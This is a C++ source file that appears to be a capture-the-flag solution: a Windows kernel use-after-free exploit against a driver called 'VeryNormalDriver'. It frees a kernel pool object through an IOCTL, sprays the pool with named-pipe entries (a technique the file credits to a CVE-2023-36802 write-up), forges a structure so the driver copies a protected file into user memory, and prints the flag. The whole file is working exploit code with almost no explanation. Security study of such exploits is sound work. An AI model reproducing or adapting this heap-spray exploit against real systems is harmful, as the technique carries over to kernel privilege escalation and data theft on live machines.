#include <iostream>
#include <Windows.h>
#include <assert.h>

#define IOCTL_COMMAND 0x80004
#define IOCTL_ALLOC_POOL 0x80002000
#define IOCTL_FREE_USER_CONTROLLED 0x80002004
#define IOCTL_ALOC_PAGES 0x80002008
#define IOCTL_IRQL 0x8000200c
#define IOCTL_IRQL_SIMILAR 0x80002010
#define IOCTL_READ_FILE 0x80002014


VOID AllocateKernelObject(HANDLE hDriver) {
    UINT8 buffer[512] = { 0 };
    memset(buffer, 0x70, 512);
    DWORD* bufferLength = (DWORD*)((buffer)+8);
    DWORD targetLength = 0x78; // 0x68+0x38 = 160 decimal were getting B0
    *bufferLength = targetLength;
    BOOL result = DeviceIoControl(hDriver, 0x80002000, &buffer, 512, NULL, 0, NULL, NULL);
    if (result) {
        printf("Allocated Kernel Object \n", result);
    }
    else {
        printf("Failed To Allocate Kernel Object \n", result);
        exit(0);
    }
}

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef NTSTATUS (*NtFsControlFile)(
    IN HANDLE               FileHandle,
    IN HANDLE               Event OPTIONAL,
    IN VOID* ApcRoutine OPTIONAL,
    IN PVOID                ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK    IoStatusBlock,
    IN ULONG                FsControlCode,
    IN PVOID                InputBuffer OPTIONAL,
    IN ULONG                InputBufferLength,
    OUT PVOID               OutputBuffer OPTIONAL,
    IN ULONG                OutputBufferLength);

// shout to https://medium.com/reverence-cyber/cve-2023-36802-mssksrv-sys-local-privilege-escalation-reverence-cyber-d54316eaf118
// for the unbuffered pipe example below

#define FSCTL_CODE 0x119ff8
#define SPRAY_SIZE 0x10000
#define PIPESPRAY_SIZE 0xC0
#define PAYLOAD_SIZE 0xC0

HANDLE phPipeHandleArray[sizeof(HANDLE) * SPRAY_SIZE];
HANDLE phFileArray[sizeof(HANDLE) * SPRAY_SIZE];

void CreateHoles() {
    for (int i = 0; i < SPRAY_SIZE; i += 4)
    {
        CloseHandle(phPipeHandleArray[i]);
        CloseHandle(phFileArray[i]);
    }
}


VOID UnbufferedHeapSpray(void* data,int size) {
    IO_STATUS_BLOCK isb;
    OVERLAPPED ol;
    NtFsControlFile _NtfsControlFile  = (NtFsControlFile)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtFsControlFile");
    if (_NtfsControlFile == NULL) {
        printf("[-] Failed to get function\n");
        return;
    }

    for (int i = 0; i < SPRAY_SIZE; i++) {
        phPipeHandleArray[i] = CreateNamedPipe(L"\\\\.\\pipe\\exploit", PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, size, size, 0, 0);

        if (phPipeHandleArray[i] == INVALID_HANDLE_VALUE) {
            printf("[!] Error while creating the named pipe: %d\n", GetLastError());
            exit(1);
        }

        memset(&ol, 0, sizeof(ol));
        ol.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
        if (!ol.hEvent) {
            printf("[!] Error creating event: %d\n", GetLastError());
            exit(1);
        }

        phFileArray[i] = CreateFile(L"\\\\.\\pipe\\exploit", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

        if (phFileArray[i] == INVALID_HANDLE_VALUE) {
            printf("[!] Error while opening the named pipe: %d\n", GetLastError());
            exit(1);
        }

        NTSTATUS ret = _NtfsControlFile(phPipeHandleArray[i], 0, 0, 0, &isb, FSCTL_CODE, data, size, NULL, 0);

        if (ret == STATUS_PENDING) {
            DWORD bytesTransferred;
            if (!GetOverlappedResult(phFileArray[i], &ol, &bytesTransferred, TRUE)) {
                printf("[!] Overlapped operation failed: %d\n", GetLastError());
                exit(1);
            }
        }
        else if (ret != 0) {
            printf("[!] Error while calling NtFsControlFile: %p\n", ret);
            exit(1);
        }

        CloseHandle(ol.hEvent);
    }


}

typedef struct payload_t {
    LIST_ENTRY64 Entry;
    UINT64 Pid;
    UINT64 ZeroIfFree;
    UINT64 * MdlAddress;
    UINT64 MappedPagesAddress;
    UINT64 Length;
} PAYLOAD;

int main(int argc, char** argv)
{
    printf("[+] Allocating Object\n");
    HANDLE hDriver = CreateFile(L"\\\\.\\VeryNormalDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("failed to open driver %u\n", GetLastError());
        return -1;
    }
    AllocateKernelObject(hDriver);
    printf("[+] Freeing Object\n");
    CloseHandle(hDriver);
    void* data = VirtualAlloc(NULL, 0xB0, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    void* data2 = VirtualAlloc(NULL, 0xB0, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    memset(data, 0x41, 0xB0);
    memset(data2, 0x0, 0xB0);
    PAYLOAD p = {0};
    p.Pid = GetCurrentProcessId();
    p.ZeroIfFree = 0xFFFFFFFF;
    VOID* OurBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memset(OurBuffer, 0x0, 0x1000);
    p.MappedPagesAddress = (UINT64)OurBuffer;
    *(PAYLOAD*)data = p;
    UnbufferedHeapSpray(data, 0xB0);
    printf("[+] Spraying heap!\n");
    CreateHoles();
    printf("[+] Attempting to exploit the UAF now\n");
    hDriver = CreateFile(L"\\\\.\\VeryNormalDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("failed to open driver %u\n", GetLastError());
        return -1;
    }
    printf("[+] Attempting to read file\n");
	DeviceIoControl(hDriver, 0x80002014, NULL, 0x0, NULL, 0, NULL, NULL);
    printf("[+] Attempting to copy file to our buffer\n");
	DeviceIoControl(hDriver, 0x80002010, NULL, 0x0, NULL, 0, NULL, NULL);

    printf("[+] Flag %s\n", (char*)p.MappedPagesAddress);

    memset(&p, 0x0, sizeof(PAYLOAD));
    PAYLOAD p2 = { 0 };
    p2.Entry.Flink = (UINT64)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    p2.Entry.Blink = (UINT64)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memset((VOID*)p2.Entry.Flink, 0x0, 0x1000);
    *(PAYLOAD*)data2 = p2;
	printf("[+] Refilling holes!\n");
    // refill the holes so we dont crash the machine
    UnbufferedHeapSpray(data2, 0xB0);
    UnbufferedHeapSpray(data2, 0xB0);
    UnbufferedHeapSpray(data2, 0xB0);
	printf("[+] Done!\n");

    return 0;
}
